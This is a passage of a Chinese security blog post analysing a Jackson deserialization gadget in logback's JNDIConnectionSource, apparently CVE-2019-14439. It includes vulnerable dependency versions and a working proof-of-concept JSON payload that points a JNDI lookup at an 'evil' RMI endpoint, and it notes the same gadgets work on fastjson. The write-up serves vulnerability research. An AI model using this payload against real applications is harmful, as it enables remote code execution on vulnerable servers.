+            if (this.dataSource == null) {
+                this.dataSource = this.lookupDataSource();
+            }
+
+            if (this.getUser() != null) {
+                this.addWarn(&quot;Ignoring property [user] with value [&quot; + this.getUser() + &quot;] for obtaining a connection from a DataSource.&quot;);
+            }
+
+            conn = this.dataSource.getConnection();
+            return conn;
+        } catch (NamingException var3) {
+            this.addError(&quot;Error while getting data source&quot;, var3);
+            throw new SQLException(&quot;NamingException while looking up DataSource: &quot; + var3.getMessage());
+        } catch (ClassCastException var4) {
+            this.addError(&quot;ClassCastException while looking up DataSource.&quot;, var4);
+            throw new SQLException(&quot;ClassCastException while looking up DataSource: &quot; + var4.getMessage());
+        }
+    }
+
+    public String getJndiLocation() {
+        return this.jndiLocation;
+    }
+
+    public void setJndiLocation(String jndiLocation) {
+        this.jndiLocation = jndiLocation;
+    }
+
+    private DataSource lookupDataSource() throws NamingException, SQLException {
+        this.addInfo(&quot;Looking up [&quot; + this.jndiLocation + &quot;] in JNDI&quot;);
+        Context initialContext = new InitialContext();
+        Object obj = initialContext.lookup(this.jndiLocation);
+        DataSource ds = (DataSource)obj;
+        if (ds == null) {
+            throw new SQLException(&quot;Failed to obtain data source from JNDI location &quot; + this.jndiLocation);
+        } else {
+            return ds;
+        }
+    }
+}</code></pre><p>通过调用 setJndiLocation 方法设置 jndi URL。</p><p>再调用 getConnection 方法连接触发JNDI注入</p><p>使用 Jackson 复现一下这个过程</p><p>先添加 logback 和 jackson 依赖</p><pre><code>        &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
+            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
+            &lt;version&gt;2.9.9.1&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-core --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
+            &lt;artifactId&gt;logback-core&lt;/artifactId&gt;
+            &lt;version&gt;1.3.0-alpha4&lt;/version&gt;
+        &lt;/dependency&gt;</code></pre><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6f0d031a0a2f06171c0a0c41001d08">[email&#160;protected]</a>
+ * @since 2019/7/30 19:27
+ */
+public class Logback {
+
+    public static void main(String[] args) throws IOException {
+
+        String json = &quot;[\&quot;ch.qos.logback.core.db.JNDIConnectionSource\&quot;,&quot; +
+                &quot;{\&quot;jndiLocation\&quot;:\&quot;rmi://127.0.0.1:1099/evil\&quot;}}]&quot;;
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        Object o = mapper.readValue(json, Object.class);
+        mapper.writeValueAsString(o);
+    }
+
+}</code></pre><p><img src="/usr/uploads/2019/07/2568048837.jpg" alt="1564486126(1).jpg" title="1564486126(1).jpg"></p><p>同样需要再序列化一遍，调用所有个 get 方法，才可以触发 getConnection 方法执行 JNDI 连接请求。</p><h1>再BB两句</h1><p>另外 jackson 的这几个 gadgets 也可以用在 fastjson 上。</p>        </div>
+    </article>
+
+    <div id="comments">
+            <h3 class="responses-title">Comments : 1 </h3>
+    
+    <ol class="comment-list">    <li class="comment">
+			<div id="comment-9" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/ffa308bbab7eaa2ab7d63bb38312404e?s=32&r=G&d=" alt="1" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author">1									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/189.html?replyTo=9#respond-post-189" rel="nofollow" onclick="return TypechoComment.reply('comment-9', 9);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2020-03-04 16:12:32" itemprop="datePublished">2020-03-04 16:12:32</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>最后一个应该是CVE-2019-14439</p>					</div>
+			</div>
+                </li>
+    </ol>
+	<div class="lists-navigator clearfix">
+    	</div>
+    
+    
+        <div id="respond-post-189" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/189.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/189.html#respond-post-189" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
